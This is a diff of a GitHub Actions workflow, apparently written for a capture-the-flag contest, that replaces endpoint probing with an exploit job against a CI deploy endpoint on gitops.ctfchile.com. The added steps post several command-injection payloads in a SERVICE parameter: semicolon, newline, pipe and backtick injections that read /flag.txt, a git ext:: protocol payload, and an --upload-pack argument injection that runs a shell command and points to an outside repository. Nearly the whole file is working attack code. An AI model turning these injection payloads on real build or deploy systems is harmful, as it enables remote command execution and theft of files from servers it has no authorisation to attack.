@@ -1,61 +1,51 @@
-name: CTF Attack
+name: CTF Exploit v2
 on:
   push:
     branches: [ master ]
   workflow_dispatch:
 
 jobs:
-  recon:
+  exploit:
     runs-on: ubuntu-latest
     steps:
-      - name: Recon platform
+      - name: Get buildWithParameters form
         run: |
-          echo "=== HOME PAGE ==="
-          curl -sk https://gitops.ctfchile.com | head -200
+          echo "=== GET /job/deploy-service/buildWithParameters ==="
+          curl -sk https://gitops.ctfchile.com/job/deploy-service/buildWithParameters
           echo ""
-          echo "=== PROBE ENDPOINTS ==="
-          for ep in / /api /deploy /build /run /pipeline /clone /job /ci /webhook /hook; do
-            echo "--- $ep ---"
-            curl -sk -o /dev/null -w "%{http_code} %{url_effective}\n" https://gitops.ctfchile.com$ep
-          done
+          echo "=== GET /job/deploy-service ==="
+          curl -sk https://gitops.ctfchile.com/job/deploy-service
 
-      - name: Exploit - POST probes
+      - name: Exploit - bash injection via service param
         run: |
-          echo "=== POST /deploy ==="
-          curl -sk -X POST https://gitops.ctfchile.com/deploy \
-            -H "Content-Type: application/json" \
-            -d '{"service":"test"}' | head -100
+          echo "=== PAYLOAD 1: semicolon injection ==="
+          curl -sk -X POST "https://gitops.ctfchile.com/job/deploy-service/buildWithParameters" \
+            --data-urlencode 'SERVICE=test; cat /flag.txt' | grep -E "flag|CTF|output|result|error|clone" | head -30
           echo ""
-          echo "=== POST /build ==="
-          curl -sk -X POST https://gitops.ctfchile.com/build \
-            -H "Content-Type: application/json" \
-            -d '{"service":"test"}' | head -100
+          echo "=== PAYLOAD 2: newline injection ==="
+          curl -sk -X POST "https://gitops.ctfchile.com/job/deploy-service/buildWithParameters" \
+            -d 'SERVICE=test%0acat+/flag.txt' | grep -E "flag|CTF|output|result" | head -30
           echo ""
-          echo "=== POST /run ==="
-          curl -sk -X POST https://gitops.ctfchile.com/run \
-            -H "Content-Type: application/json" \
-            -d '{"service":"test"}' | head -100
+          echo "=== PAYLOAD 3: pipe injection ==="
+          curl -sk -X POST "https://gitops.ctfchile.com/job/deploy-service/buildWithParameters" \
+            --data-urlencode 'SERVICE=test | cat /flag.txt' | grep -E "flag|CTF|output|result" | head -30
           echo ""
-          echo "=== POST / with form ==="
-          curl -sk -X POST https://gitops.ctfchile.com/ \
-            -d 'service=test' | head -100
+          echo "=== PAYLOAD 4: backtick injection ==="
+          curl -sk -X POST "https://gitops.ctfchile.com/job/deploy-service/buildWithParameters" \
+            --data-urlencode 'SERVICE=`cat /flag.txt`' | grep -E "flag|CTF|output|result" | head -30
 
-      - name: Exploit - injection payloads
+      - name: Exploit - ext protocol
         run: |
-          echo "=== PAYLOAD 1: bash injection ==="
-          curl -sk -X POST https://gitops.ctfchile.com/deploy \
-            -H "Content-Type: application/json" \
-            -d '{"service":"x; cat /flag.txt"}' | head -100
+          echo "=== PAYLOAD 5: ext:: protocol ==="
+          curl -sk -X POST "https://gitops.ctfchile.com/job/deploy-service/buildWithParameters" \
+            --data-urlencode 'SERVICE=ext::sh -c cat /flag.txt >&2' | head -50
           echo ""
-          curl -sk -X POST https://gitops.ctfchile.com/ \
-            -d 'service=x;+cat+/flag.txt' | head -100
-          echo ""
-          echo "=== PAYLOAD 2: ext:: git protocol ==="
-          curl -sk -X POST https://gitops.ctfchile.com/deploy \
-            -H "Content-Type: application/json" \
-            -d '{"service":"ext::sh -c cat /flag.txt >&2"}' | head -100
-          echo ""
-          echo "=== PAYLOAD 3: --config hooksPath ==="
-          curl -sk -X POST https://gitops.ctfchile.com/deploy \
-            -H "Content-Type: application/json" \
-            -d '{"service":"--config core.hooksPath=hooks https://github.com/chilectf/exploit"}' | head -100
+          echo "=== PAYLOAD 6: --upload-pack injection ==="
+          curl -sk -X POST "https://gitops.ctfchile.com/job/deploy-service/buildWithParameters" \
+            --data-urlencode 'SERVICE=--upload-pack=touch /tmp/pwned https://github.com/chilectf/exploit' | head -50
+
+      - name: Full response - PAYLOAD 1
+        run: |
+          echo "=== FULL RESPONSE semicolon ==="
+          curl -sk -X POST "https://gitops.ctfchile.com/job/deploy-service/buildWithParameters" \
+            --data-urlencode 'SERVICE=x; cat /flag.txt'
